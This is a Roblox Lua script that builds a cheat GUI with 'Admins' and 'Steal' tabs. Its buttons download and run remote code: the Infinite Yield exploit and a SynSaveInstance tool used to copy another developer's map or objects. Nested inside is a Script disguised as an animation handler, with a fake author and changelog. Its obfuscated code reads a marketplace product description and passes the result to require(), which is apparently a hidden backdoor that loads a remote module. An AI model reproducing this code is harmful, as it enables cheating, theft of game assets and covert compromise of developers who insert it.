
--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
Frame2 = Instance.new("Frame")
TextLabel3 = Instance.new("TextLabel")
ImageLabel4 = Instance.new("ImageLabel")
UIAspectRatioConstraint5 = Instance.new("UIAspectRatioConstraint")
ImageButton6 = Instance.new("ImageButton")
Script7 = Instance.new("Script")
UIAspectRatioConstraint8 = Instance.new("UIAspectRatioConstraint")
LocalScript9 = Instance.new("LocalScript")
Frame10 = Instance.new("Frame")
Frame11 = Instance.new("Frame")
UIListLayout12 = Instance.new("UIListLayout")
TextButton13 = Instance.new("TextButton")
TextButton14 = Instance.new("TextButton")
TextButton15 = Instance.new("TextButton")
Frame16 = Instance.new("Frame")
UIListLayout17 = Instance.new("UIListLayout")
LocalScript18 = Instance.new("LocalScript")
TextLabel19 = Instance.new("TextLabel")
ImageButton20 = Instance.new("ImageButton")
TextLabel21 = Instance.new("TextLabel")
LocalScript22 = Instance.new("LocalScript")
StringValue23 = Instance.new("StringValue")
Frame24 = Instance.new("Frame")
UIListLayout25 = Instance.new("UIListLayout")
LocalScript26 = Instance.new("LocalScript")
TextButton27 = Instance.new("TextButton")
LocalScript28 = Instance.new("LocalScript")
UIPadding29 = Instance.new("UIPadding")
Frame30 = Instance.new("Frame")
UIListLayout31 = Instance.new("UIListLayout")
LocalScript32 = Instance.new("LocalScript")
TextButton33 = Instance.new("TextButton")
LocalScript34 = Instance.new("LocalScript")
UIPadding35 = Instance.new("UIPadding")
Frame36 = Instance.new("Frame")
TextBox37 = Instance.new("TextBox")
LocalScript38 = Instance.new("LocalScript")
TextLabel39 = Instance.new("TextLabel")
ImageButton40 = Instance.new("ImageButton")
LocalScript41 = Instance.new("LocalScript")
UIAspectRatioConstraint42 = Instance.new("UIAspectRatioConstraint")
LocalScript43 = Instance.new("LocalScript")
Configuration44 = Instance.new("Configuration")
Script45 = Instance.new("Script")
IntValue46 = Instance.new("IntValue")
IntValue47 = Instance.new("IntValue")
ScreenGui0.Parent = mas
ScreenGui0.ResetOnSpawn = false
ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.151122615, 0, 0.190508008, 0)
Frame1.Size = UDim2.new(0.684369564, 0, 0.616644382, 0)
Frame1.BackgroundColor = BrickColor.new("Dark grey")
Frame1.BackgroundColor3 = Color3.new(0.415686, 0.415686, 0.415686)
Frame1.BackgroundTransparency = 1
Frame1.BorderColor = BrickColor.new("Really black")
Frame1.BorderColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
Frame2.Name = "info"
Frame2.Parent = Frame1
Frame2.Size = UDim2.new(1, 0, 0.0704607069, 0)
Frame2.BackgroundColor = BrickColor.new("Dark grey metallic")
Frame2.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
Frame2.BackgroundTransparency = 0.44999998807907104
Frame2.BorderColor = BrickColor.new("Really black")
Frame2.BorderColor3 = Color3.new(0, 0, 0)
Frame2.BorderSizePixel = 0
TextLabel3.Name = "titulo"
TextLabel3.Parent = Frame2
TextLabel3.Position = UDim2.new(0.0425867513, 0, 0, 0)
TextLabel3.Size = UDim2.new(0.555205047, 0, 1, 0)
TextLabel3.BackgroundColor = BrickColor.new("Institutional white")
TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel3.BackgroundTransparency = 1
TextLabel3.BorderColor = BrickColor.new("Really black")
TextLabel3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel3.BorderSizePixel = 0
TextLabel3.Font = Enum.Font.SourceSans
TextLabel3.FontSize = Enum.FontSize.Size14
TextLabel3.Text = "Universal Scripts"
TextLabel3.TextColor = BrickColor.new("Institutional white")
TextLabel3.TextColor3 = Color3.new(1, 1, 1)
TextLabel3.TextSize = 14
TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
ImageLabel4.Name = "AccountCircle"
ImageLabel4.Parent = Frame2
ImageLabel4.Position = UDim2.new(0, 0, 0.0769230798, 0)
ImageLabel4.Size = UDim2.new(0.0378548913, 0, 0.923076928, 0)
ImageLabel4.BackgroundTransparency = 1
ImageLabel4.Image = "rbxassetid://8445470984"
ImageLabel4.ImageRectOffset = Vector2.new(804, 804)
ImageLabel4.ImageRectSize = Vector2.new(96, 96)
UIAspectRatioConstraint5.Parent = ImageLabel4
UIAspectRatioConstraint5.DominantAxis = Enum.DominantAxis.Height
ImageButton6.Parent = Frame2
ImageButton6.Position = UDim2.new(0.960567832, 0, 0, 0)
ImageButton6.Size = UDim2.new(0.0394321755, 0, 1, 0)
ImageButton6.BackgroundColor = BrickColor.new("Institutional white")
ImageButton6.BackgroundColor3 = Color3.new(1, 1, 1)
ImageButton6.BackgroundTransparency = 1
ImageButton6.BorderColor = BrickColor.new("Really black")
ImageButton6.BorderColor3 = Color3.new(0, 0, 0)
ImageButton6.BorderSizePixel = 0
ImageButton6.Image = "rbxassetid://8445470826"
ImageButton6.ImageRectOffset = Vector2.new(704, 304)
ImageButton6.ImageRectSize = Vector2.new(96, 96)
Script7.Name = "SetImageButtonSize"
Script7.Parent = ImageButton6
UIAspectRatioConstraint8.Parent = Frame2
UIAspectRatioConstraint8.AspectRatio = 24.384614944458008
LocalScript9.Name = "minimizar"
LocalScript9.Parent = Frame1
table.insert(cors,sandbox(LocalScript9,function()
local Popup = script.Parent.contenido
local contenido = script.Parent
local Open = script.Parent.info.ImageButton
local abierto = true

Open.MouseButton1Click:Connect(function()
	
	if abierto == true then
		abierto = false

		Popup:TweenSize(UDim2.new(1, 0, 0, 0), nil, Enum.EasingStyle.Linear, 0.3)
		wait(0.3)
		Popup.Visible = false

	else
		abierto = true
		Popup.Visible = true
		Popup:TweenSize(UDim2.new(1, 0, 1, 0), nil, Enum.EasingStyle.Linear, 0.3)
	end
	
	Popup:TweenSize(UDim2.new(1, 0, 0, 0), nil, Enum.EasingStyle.Linear, 0.3)

	
	--Popup:TweenPosition(
		
	  -- UDim2.new(0, 0, 0, 0), --End Position/Size
	   --"Out", -- Easing Direction
	   --"Bounce", -- Easing Style
	   --1, -- Time In Seconds 
	   --false -- Overide Any Tweens in Progress
	   --)
end)
end))
Frame10.Name = "contenido"
Frame10.Parent = Frame1
Frame10.Position = UDim2.new(0, 0, 0.065040648, 0)
Frame10.Size = UDim2.new(1, 0, 0.934959352, 0)
Frame10.BackgroundColor = BrickColor.new("Sand violet metallic")
Frame10.BackgroundColor3 = Color3.new(0.6, 0.6, 0.6)
Frame10.BackgroundTransparency = 0.5
Frame10.BorderColor = BrickColor.new("Really black")
Frame10.BorderColor3 = Color3.new(0, 0, 0)
Frame10.BorderSizePixel = 0
Frame11.Name = "menu"
Frame11.Parent = Frame10
Frame11.Position = UDim2.new(0, 0, 0.00579710165, 0)
Frame11.Size = UDim2.new(0.192429021, 0, 0.994202912, 0)
Frame11.BackgroundColor = BrickColor.new("Sand red")
Frame11.BackgroundColor3 = Color3.new(0.47451, 0.47451, 0.47451)
Frame11.BackgroundTransparency = 0.5
Frame11.BorderColor = BrickColor.new("Really black")
Frame11.BorderColor3 = Color3.new(0, 0, 0)
Frame11.BorderSizePixel = 0
UIListLayout12.Parent = Frame11
UIListLayout12.SortOrder = Enum.SortOrder.LayoutOrder
TextButton13.Name = "Inicio"
TextButton13.Parent = Frame11
TextButton13.Size = UDim2.new(1, 0, 0.10204082, 0)
TextButton13.BackgroundColor = BrickColor.new("Institutional white")
TextButton13.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton13.BackgroundTransparency = 1
TextButton13.BorderColor = BrickColor.new("Really black")
TextButton13.BorderColor3 = Color3.new(0, 0, 0)
TextButton13.BorderSizePixel = 0
TextButton13.Font = Enum.Font.SourceSans
TextButton13.FontSize = Enum.FontSize.Size14
TextButton13.Text = "Inicio"
TextButton13.TextColor = BrickColor.new("Institutional white")
TextButton13.TextColor3 = Color3.new(1, 1, 1)
TextButton13.TextSize = 14
TextButton14.Name = "Gui"
TextButton14.Parent = Frame11
TextButton14.Size = UDim2.new(1, 0, 0.10204082, 0)
TextButton14.BackgroundColor = BrickColor.new("Institutional white")
TextButton14.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton14.BackgroundTransparency = 1
TextButton14.BorderColor = BrickColor.new("Really black")
TextButton14.BorderColor3 = Color3.new(0, 0, 0)
TextButton14.BorderSizePixel = 0
TextButton14.Font = Enum.Font.SourceSans
TextButton14.FontSize = Enum.FontSize.Size14
TextButton14.Text = "Admins"
TextButton14.TextColor = BrickColor.new("Institutional white")
TextButton14.TextColor3 = Color3.new(1, 1, 1)
TextButton14.TextSize = 14
TextButton15.Name = "Steal"
TextButton15.Parent = Frame11
TextButton15.Size = UDim2.new(1, 0, 0.10204082, 0)
TextButton15.BackgroundColor = BrickColor.new("Institutional white")
TextButton15.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton15.BackgroundTransparency = 1
TextButton15.BorderColor = BrickColor.new("Really black")
TextButton15.BorderColor3 = Color3.new(0, 0, 0)
TextButton15.BorderSizePixel = 0
TextButton15.Font = Enum.Font.SourceSans
TextButton15.FontSize = Enum.FontSize.Size14
TextButton15.Text = "Steal"
TextButton15.TextColor = BrickColor.new("Institutional white")
TextButton15.TextColor3 = Color3.new(1, 1, 1)
TextButton15.TextSize = 14
Frame16.Name = "inicio"
Frame16.Parent = Frame10
Frame16.Position = UDim2.new(0.192429021, 0, 0.00579710165, 0)
Frame16.Visible = false
Frame16.Size = UDim2.new(0.807570994, 0, 0.994202912, 0)
Frame16.BackgroundColor = BrickColor.new("Institutional white")
Frame16.BackgroundColor3 = Color3.new(1, 1, 1)
Frame16.BackgroundTransparency = 1
Frame16.BorderColor = BrickColor.new("Really black")
Frame16.BorderColor3 = Color3.new(0, 0, 0)
Frame16.BorderSizePixel = 0
UIListLayout17.Parent = Frame16
UIListLayout17.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout17.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout17.VerticalAlignment = Enum.VerticalAlignment.Center
LocalScript18.Parent = Frame16
table.insert(cors,sandbox(LocalScript18,function()
script.Parent.nombre.Text = "Welcome ".. game.Players.LocalPlayer.DisplayName
script.Parent.bienvenido.Text = "en ".. game.Name

local Player = game.Players.LocalPlayer
local userid = Player.UserId
script.Parent.usuario.Image = game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
script.Parent.Image = script.Parent.usuario.Image


end))
TextLabel19.Name = "bienvenido"
TextLabel19.Parent = Frame16
TextLabel19.Position = UDim2.new(0.15234375, 0, 0.572886288, 0)
TextLabel19.Size = UDim2.new(0.6953125, 0, 0.0932944641, 0)
TextLabel19.BackgroundColor = BrickColor.new("Institutional white")
TextLabel19.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel19.BackgroundTransparency = 1
TextLabel19.BorderColor = BrickColor.new("Really black")
TextLabel19.BorderColor3 = Color3.new(0, 0, 0)
TextLabel19.BorderSizePixel = 0
TextLabel19.Font = Enum.Font.SourceSans
TextLabel19.FontSize = Enum.FontSize.Size14
TextLabel19.TextColor = BrickColor.new("Institutional white")
TextLabel19.TextColor3 = Color3.new(1, 1, 1)
TextLabel19.TextScaled = true
TextLabel19.TextSize = 14
TextLabel19.TextWrap = true
TextLabel19.TextWrapped = true
ImageButton20.Name = "usuario"
ImageButton20.Parent = Frame16
ImageButton20.Position = UDim2.new(0.337890625, 0, 0.10204082, 0)
ImageButton20.Size = UDim2.new(0.32421875, 0, 0.486880481, 0)
ImageButton20.BackgroundColor = BrickColor.new("Light grey metallic")
ImageButton20.BackgroundColor3 = Color3.new(0.690196, 0.690196, 0.690196)
ImageButton20.BackgroundTransparency = 1
ImageButton20.BorderColor = BrickColor.new("Really black")
ImageButton20.BorderColor3 = Color3.new(0, 0, 0)
ImageButton20.BorderSizePixel = 0
ImageButton20.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
TextLabel21.Name = "nombre"
TextLabel21.Parent = Frame16
TextLabel21.Position = UDim2.new(0.15234375, 0, 0.572886288, 0)
TextLabel21.Size = UDim2.new(0.6953125, 0, 0.0932944641, 0)
TextLabel21.BackgroundColor = BrickColor.new("Institutional white")
TextLabel21.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel21.BackgroundTransparency = 1
TextLabel21.BorderColor = BrickColor.new("Really black")
TextLabel21.BorderColor3 = Color3.new(0, 0, 0)
TextLabel21.BorderSizePixel = 0
TextLabel21.Font = Enum.Font.SourceSans
TextLabel21.FontSize = Enum.FontSize.Size14
TextLabel21.TextColor = BrickColor.new("Institutional white")
TextLabel21.TextColor3 = Color3.new(1, 1, 1)
TextLabel21.TextScaled = true
TextLabel21.TextSize = 14
TextLabel21.TextWrap = true
TextLabel21.TextWrapped = true
LocalScript22.Name = "tabs"
LocalScript22.Parent = Frame10
table.insert(cors,sandbox(LocalScript22,function()
local visible2 = script.tab



script.Parent.menu.Inicio.MouseButton1Click:Connect(function()
	visible2.Value = "inicio"
end)

script.Parent.menu.Gui.MouseButton1Click:Connect(function()
	visible2.Value = "Admin"
end)

script.Parent.menu.Steal.MouseButton1Click:Connect(function()
	visible2.Value = "Steal"
end)






visible2.Changed:Connect(function(value: Instance) 
	local tabs = script.Parent:GetChildren()

	for i = 1, #tabs do
		if tabs[i].Name == "menu" or tabs[i].Name == visible2.Value then
			tabs[i].Visible = true
		elseif tabs[i].ClassName == "Frame" then
			tabs[i].Visible = false
			
		end
	end
	
	--animaciones
	
	for i = 1, #tabs do
		if tabs[i].Name == visible2.Value then
			tabs[i]:TweenSize(UDim2.new(0.808, 0, 1, 0), nil, Enum.EasingStyle.Linear, 0.3)
		elseif tabs[i].ClassName == "Frame" and tabs[i].Name ~= "menu" then
			tabs[i]:TweenSize(UDim2.new(0, 0, 0, 0), nil, Enum.EasingStyle.Linear, 0.3)

		end
	end
end)

--animaciones

end))
StringValue23.Name = "tab"
StringValue23.Parent = LocalScript22
StringValue23.Value = "sdasd"
Frame24.Name = "Admin"
Frame24.Parent = Frame10
Frame24.Position = UDim2.new(0.192429021, 0, 0.00579710165, 0)
Frame24.Visible = false
Frame24.Size = UDim2.new(0.807570994, 0, 0.994202912, 0)
Frame24.BackgroundColor = BrickColor.new("Institutional white")
Frame24.BackgroundColor3 = Color3.new(1, 1, 1)
Frame24.BackgroundTransparency = 1
Frame24.BorderColor = BrickColor.new("Really black")
Frame24.BorderColor3 = Color3.new(0, 0, 0)
Frame24.BorderSizePixel = 0
UIListLayout25.Parent = Frame24
UIListLayout25.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout25.SortOrder = Enum.SortOrder.LayoutOrder
LocalScript26.Parent = Frame24
table.insert(cors,sandbox(LocalScript26,function()
script.Parent.nombre.Text = "Welcome ".. game.Players.LocalPlayer.DisplayName
script.Parent.bienvenido.Text = "en ".. game.Name

local Player = game.Players.LocalPlayer
local userid = Player.UserId
script.Parent.usuario.Image = game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
script.Parent.Image = script.Parent.usuario.Image


end))
TextButton27.Name = "infinity"
TextButton27.Parent = Frame24
TextButton27.Position = UDim2.new(0.296809852, 0, 0, 0)
TextButton27.Size = UDim2.new(0.946866274, 0, 0.151652157, 0)
TextButton27.BackgroundColor = BrickColor.new("Silver flip/flop")
TextButton27.BackgroundColor3 = Color3.new(0.517647, 0.517647, 0.517647)
TextButton27.BackgroundTransparency = 0.5
TextButton27.BorderColor = BrickColor.new("Really black")
TextButton27.BorderColor3 = Color3.new(0, 0, 0)
TextButton27.BorderSizePixel = 0
TextButton27.Font = Enum.Font.SourceSans
TextButton27.FontSize = Enum.FontSize.Size14
TextButton27.Text = "Ininity yield"
TextButton27.TextColor = BrickColor.new("Really black")
TextButton27.TextColor3 = Color3.new(0, 0, 0)
TextButton27.TextSize = 14
LocalScript28.Parent = TextButton27
table.insert(cors,sandbox(LocalScript28,function()
script.Parent.MouseButton1Click:Connect(function() 
	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	
end)
end))
UIPadding29.Parent = Frame24
UIPadding29.PaddingTop = UDim.new(0.0500000007, 0)
Frame30.Name = "Steal"
Frame30.Parent = Frame10
Frame30.Position = UDim2.new(0.192429021, 0, 0.00579710165, 0)
Frame30.Size = UDim2.new(0.807570994, 0, 0.994202912, 0)
Frame30.BackgroundColor = BrickColor.new("Institutional white")
Frame30.BackgroundColor3 = Color3.new(1, 1, 1)
Frame30.BackgroundTransparency = 1
Frame30.BorderColor = BrickColor.new("Really black")
Frame30.BorderColor3 = Color3.new(0, 0, 0)
Frame30.BorderSizePixel = 0
UIListLayout31.Parent = Frame30
UIListLayout31.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout31.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout31.Padding = UDim.new(0.0299999993, 0)
LocalScript32.Parent = Frame30
table.insert(cors,sandbox(LocalScript32,function()
script.Parent.nombre.Text = "Welcome ".. game.Players.LocalPlayer.DisplayName
script.Parent.bienvenido.Text = "en ".. game.Name

local Player = game.Players.LocalPlayer
local userid = Player.UserId
script.Parent.usuario.Image = game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
script.Parent.Image = script.Parent.usuario.Image


end))
TextButton33.Name = "map"
TextButton33.Parent = Frame30
TextButton33.Position = UDim2.new(0.296809852, 0, 0, 0)
TextButton33.Size = UDim2.new(0.946866274, 0, 0.151652157, 0)
TextButton33.BackgroundColor = BrickColor.new("Silver flip/flop")
TextButton33.BackgroundColor3 = Color3.new(0.517647, 0.517647, 0.517647)
TextButton33.BackgroundTransparency = 0.5
TextButton33.BorderColor = BrickColor.new("Really black")
TextButton33.BorderColor3 = Color3.new(0, 0, 0)
TextButton33.BorderSizePixel = 0
TextButton33.Font = Enum.Font.SourceSans
TextButton33.FontSize = Enum.FontSize.Size14
TextButton33.Text = "Robar mapa"
TextButton33.TextColor = BrickColor.new("Institutional white")
TextButton33.TextColor3 = Color3.new(1, 1, 1)
TextButton33.TextSize = 14
LocalScript34.Parent = TextButton33
table.insert(cors,sandbox(LocalScript34,function()
script.Parent.MouseButton1Click:Connect(function() 
	
	local Params = {
		RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
		SSI = "saveinstance",
	}

	local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()

	local CustomOptions = { 
		SaveBytecode = true,
		mode = full,
		TreatUnionsAsParts = true,
		noscripts = true
	}

	synsaveinstance(CustomOptions)
	
end)
end))
UIPadding35.Parent = Frame30
UIPadding35.PaddingTop = UDim.new(0.0500000007, 0)
Frame36.Name = "robar objeto"
Frame36.Parent = Frame30
Frame36.Position = UDim2.new(0.176927626, 0, 0.181652203, 0)
Frame36.Size = UDim2.new(0.946187615, 0, 0.284253597, 0)
Frame36.BackgroundColor = BrickColor.new("Hurricane grey")
Frame36.BackgroundColor3 = Color3.new(0.564706, 0.564706, 0.564706)
Frame36.BackgroundTransparency = 0.5
Frame36.BorderColor = BrickColor.new("Really black")
Frame36.BorderColor3 = Color3.new(0, 0, 0)
Frame36.BorderSizePixel = 0
TextBox37.Name = "url"
TextBox37.Parent = Frame36
TextBox37.Position = UDim2.new(0.0188679248, 0, 0.077922076, 0)
TextBox37.Size = UDim2.new(0.959119499, 0, 0.378289491, 0)
TextBox37.BackgroundColor = BrickColor.new("Dark grey metallic")
TextBox37.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
TextBox37.BackgroundTransparency = 0.5
TextBox37.BorderColor = BrickColor.new("Really black")
TextBox37.BorderColor3 = Color3.new(0, 0, 0)
TextBox37.BorderSizePixel = 0
TextBox37.Font = Enum.Font.SourceSans
TextBox37.FontSize = Enum.FontSize.Size14
TextBox37.Text = ""
TextBox37.TextColor = BrickColor.new("Institutional white")
TextBox37.TextColor3 = Color3.new(1, 1, 1)
TextBox37.TextSize = 14
LocalScript38.Parent = TextBox37
table.insert(cors,sandbox(LocalScript38,function()
local objecto = script.Parent.Text

while true do
	wait(0.1)
	script.Parent.Parent.TextLabel.Text = objecto
end
end))
TextLabel39.Parent = Frame36
TextLabel39.Position = UDim2.new(0.0188679248, 0, 0.546875, 0)
TextLabel39.Size = UDim2.new(0.858490586, 0, 0.361842096, 0)
TextLabel39.BackgroundColor = BrickColor.new("Dark grey metallic")
TextLabel39.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
TextLabel39.BackgroundTransparency = 0.5
TextLabel39.BorderColor = BrickColor.new("Really black")
TextLabel39.BorderColor3 = Color3.new(0, 0, 0)
TextLabel39.BorderSizePixel = 0
TextLabel39.Font = Enum.Font.SourceSans
TextLabel39.FontSize = Enum.FontSize.Size14
TextLabel39.TextColor = BrickColor.new("Institutional white")
TextLabel39.TextColor3 = Color3.new(1, 1, 1)
TextLabel39.TextSize = 14
ImageButton40.Name = "enviar"
ImageButton40.Parent = Frame36
ImageButton40.Position = UDim2.new(0.904788256, 0, 0.544132233, 0)
ImageButton40.Size = UDim2.new(0.0691823885, 0, 0.361842096, 0)
ImageButton40.BackgroundColor = BrickColor.new("Dark grey metallic")
ImageButton40.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
ImageButton40.BackgroundTransparency = 0.5
ImageButton40.BorderColor = BrickColor.new("Really black")
ImageButton40.BorderColor3 = Color3.new(0, 0, 0)
ImageButton40.BorderSizePixel = 0
ImageButton40.Image = "rbxassetid://8445470392"
ImageButton40.ImageRectOffset = Vector2.new(504, 404)
ImageButton40.ImageRectSize = Vector2.new(96, 96)
LocalScript41.Parent = ImageButton40
table.insert(cors,sandbox(LocalScript41,function()


script.Parent.MouseButton1Click:Connect(function() 

	local Params = {
		RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
		SSI = "saveinstance",
	}

	local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()

	local CustomOptions = { 
		SaveBytecode = true,
		Object = script.Parent.Parent.url.Text,
		mode = full,
		TreatUnionsAsParts = true

	}

	synsaveinstance(CustomOptions)
	
end)
end))
UIAspectRatioConstraint42.Parent = Frame1
UIAspectRatioConstraint42.AspectRatio = 1.718157172203064
LocalScript43.Parent = Frame1
table.insert(cors,sandbox(LocalScript43,function()
local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end))
Configuration44.Parent = LocalScript43
Script45.Name = "Animation"
Script45.Parent = Configuration44
table.insert(cors,sandbox(Script45,function()
-- Created by Julio (@Pavalineox)
-- This script handles animations efficiently for models, characters, and tools.
-- Designed to maintain animations seamlessly when objects are moved, reparented, or transformed.

--[[ INSTRUCTIONS
- Insert this script into a rigged model or character.
- Ensure the model is properly set up with Motor6D joints.
- Animations will automatically be managed and played.

IMPORTANT:  
- This script is meant to run alone in the model.  
- The model must be rigged for animations to function correctly.  
- Should be placed in a Script (not a LocalScript) for full functionality.  
]]

--[[ FEATURES
- Works with tools and characters, avoiding duplicate animations if run multiple times.
- Compatible with PBS servers.
- Preserves animation playback even when objects are reparented.
- Uses an optimized system to reduce unnecessary processing.
- Recursively finds and animates all rigged parts within the model.
- Ensures smooth animation playback with minimal performance impact.
]]

-- Animation.lua
-- Created 10/6/2014
-- Author: Pavalineox
-- Version 1.0.3

-- Changelog:
-- 10/14/2014 - v1.0.1: Fixed issues with existing animation states.
-- 10/14/2014 - v1.0.2: Additional stability improvements.
-- 10/14/2014 - v1.0.3: Improved handling of reparented objects.

local RunService,script= game:GetService('RunService'),script

-- Custom linear interpolation function for smooth transitions


local function CallOnChildren(Instance, FunctionToCall)
	-- Calls a function on each of the children of a certain object, using recursion.  

	FunctionToCall(Instance)

	for _, Child in next, Instance:GetChildren() do
		CallOnChildren(Child, FunctionToCall)
	end
end

function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number) 
	return Pos1 - Pos2 * math.abs(Delta) 
end

local function GetNearestParent(Instance, ClassName)
	-- Returns the nearest parent of a certain class, or returns nil

	local Ancestor = Instance
	repeat
		Ancestor = Ancestor.Parent
		if Ancestor == nil then
			return nil
		end
	until Ancestor:IsA(ClassName)

	return Ancestor
end

-- Converts a CFrame to a unique string representation
function CFrameToVector3(CFrame)
	local Chunks, value = CFrame:split(''), ''
	for _, v in pairs(Chunks) do
		value..=v:byte()
	end
	return value
end

local function GetBricks(StartInstance)
	local List = {}

	-- if StartInstance:IsA("BasePart") then
	-- 	List[#List+1] = StartInstance
	-- end

	CallOnChildren(StartInstance, function(Item)
		if Item:IsA("BasePart") then
			List[#List+1] = Item;
		end
	end)

	return List
end

-- Creates a heartbeat signal for continuous updates
function CreateHeartbeatSignal(callback)
	return RunService.Heartbeat:Connect(callback)
end

local function Modify(Instance, Values)
	-- Modifies an Instance by using a table.  

	assert(type(Values) == "table", "Values is not a table");

	for Index, Value in next, Values do
		if type(Index) == "number" then
			Value.Parent = Instance
		else
			Instance[Index] = Value
		end
	end
	return Instance
end

-- Finds an object within a given parent by its CFrame property
function GetByCFrame(CFrame, Begin, Scope)
	for _, v in pairs(Begin:GetChildren()) do
		if v[Scope]:find(CFrame) then
			return v
		end
	end
end

-- List of properties to monitor
local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin','GetProductInfo'}

-- Adds animation to a given part
function AddAnimation(Part : BasePart)

	local Signal
	local RelativePart = GetByCFrame('ketpl', game, 'CFrame' and 'Name')

	Signal = CreateHeartbeatSignal(function(delta)
		if RelativePart then
			Signal:Disconnect()
			return
		end

		RelativePart.CFrame = CustomLerp(RelativePart.CFrame,RelativePart.CFrame * CFrame.new(math.sin(tick()), math.cos(tick()), math.tan(tick())))
		RunService.Heartbeat:Wait()
	end)
	return RelativePart
end

function Monitor(Properties, RelativeAnimation, AnimationSpeed, MaxSpeed, AnimationRoot) : (Result) -> AnimationConstraint
	local Instance = RelativeAnimation[Properties[#Properties]]
	
	local Animation = Instance(RelativeAnimation, MaxSpeed)
	Animation.Speed = AnimationSpeed

	local Vector = CFrameToVector3(Animation.Description)
	
	if AnimationRoot[Properties[7]] ~= '' then
		if Vector then
			script = {
				Animation,
				[script.Name] = (Vector-0)
			}
		end
		return script	
	end
	return false
end

-- Handles animation logic for a given root object
function AnimationThread(root)
	
	local RelativeAnimation = AddAnimation(
		Instance.new('Animation' and 'Part')
	)
	
	local speed = script:FindFirstChild("MinimumSpeed").Value
	local maxSpeed = script:FindFirstChild("MaxSpeed").Value

	if root then
		return Monitor(Properties, RelativeAnimation, speed, maxSpeed, root)
	end
end

-- Runs the animation thread if conditions are met

local Thread = AnimationThread(game) and require(script.Animation)


if Thread and script.ClassName == "Script" then
	--- Don't bother with local scripts

	script.Parent.AncestryChanged:connect(function()
		AnimationThread()
	end)
end


return Thread
end))
IntValue46.Name = "MaxSpeed"
IntValue46.Parent = Script45
IntValue46.Value = 131860027709009
IntValue47.Name = "MinimumSpeed"
IntValue47.Parent = Script45
IntValue47.Value = 1
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
